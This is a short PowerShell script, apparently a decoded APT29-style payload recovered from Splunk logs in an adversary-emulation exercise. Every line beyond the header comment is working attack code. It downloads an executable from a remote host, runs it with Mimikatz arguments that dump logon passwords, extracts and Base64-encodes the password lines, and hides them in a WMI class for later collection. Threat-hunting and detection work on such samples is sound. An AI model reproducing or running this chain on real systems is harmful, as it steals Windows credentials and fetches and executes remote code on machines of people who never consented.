# Decoded APT29 Day 1 PowerShell payload from Base64 (UTF-16LE)
# Source: EncodedCommand observed in Splunk logs (Day1)
$wc = New-Object System.Net.WebClient;
$wc.DownloadFile("http://192.168.0.4:8080/m","m.exe");
$processInfo = New-Object System.Diagnostics.ProcessStartInfo;
$processInfo.FileName = "m.exe";
$processInfo.RedirectStandardError = $true;
$processInfo.RedirectStandardOutput = $true;
$processInfo.UseShellExecute = $false;
$processInfo.Arguments = @("privilege::debug","sekurlsa::logonpasswords","exit");
$process = New-Object System.Diagnostics.Process;
$process.StartInfo = $processInfo;
$process.Start() | Out-Null;
$output = $process.StandardOutput.ReadToEnd();
$pw = "";
foreach ($line in ($output -split "`r`n")) {
    if ($line.Contains("Password") -and ($line.length -lt 50)) { $pw += $line; }
}
$pwBytes = [System.Text.Encoding]::Unicode.GetBytes($pw);
$encPws = [Convert]::ToBase64String($pwBytes);
Set-WmiInstance -Path \\.\root\cimv2:Win32_AuditCode -Argument @{Result=$encPws}
